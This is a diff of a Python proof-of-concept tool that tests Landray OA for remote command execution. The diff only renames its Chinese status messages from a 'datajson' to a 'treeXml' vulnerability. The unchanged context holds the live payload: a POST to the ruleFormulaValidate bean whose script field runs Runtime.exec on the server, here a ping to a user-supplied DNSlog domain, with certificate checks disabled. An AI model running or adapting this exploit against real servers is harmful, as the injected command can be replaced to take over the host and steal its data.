@@ -22,7 +22,7 @@ def main(target_url):
         "Content-Type": "application/x-www-form-urlencoded",
         "Pragma": "no-cache",
         }
-    console.print(now_time() + " [INFO]     正在检测蓝凌OA datajson 命令执行漏洞", style='bold blue')
+    console.print(now_time() + " [INFO]     正在检测蓝凌OA_treeXml_远程命令执行", style='bold blue')
     payload=console.input(now_time() + " [INFO]     请输入DNSlog域名:")
     cmd='String cmd = "ping {}";'.format(payload)
     data='s_bean=ruleFormulaValidate&script=try {String cmd = '+cmd+'Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}'
@@ -31,10 +31,10 @@ def main(target_url):
         requests.packages.urllib3.disable_warnings()
         respones = requests.post(exp_url, headers=headers,data=data, verify=False,proxies=proxies)
         if respones.status_code == 200:
-            console.print(now_time() + ' [SUCCESS]  蓝凌OA OA datajson 命令执行漏洞存在', style='bold green')
+            console.print(now_time() + ' [SUCCESS]  蓝凌OA_treeXml_远程命令执行存在', style='bold green')
             console.print(now_time() + ' [SUCCESS]  payload:{}'.format(exp_url), style='bold green')
         else:
-            console.print(now_time() + ' [WARNING]  蓝凌OA datajson 命令执行漏洞可能不存在，请查看dnslog', style='bold red ')
+            console.print(now_time() + ' [WARNING]  蓝凌OA_treeXml_远程命令执行可能不存在，请查看dnslog', style='bold red ')
     except:
         console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
    
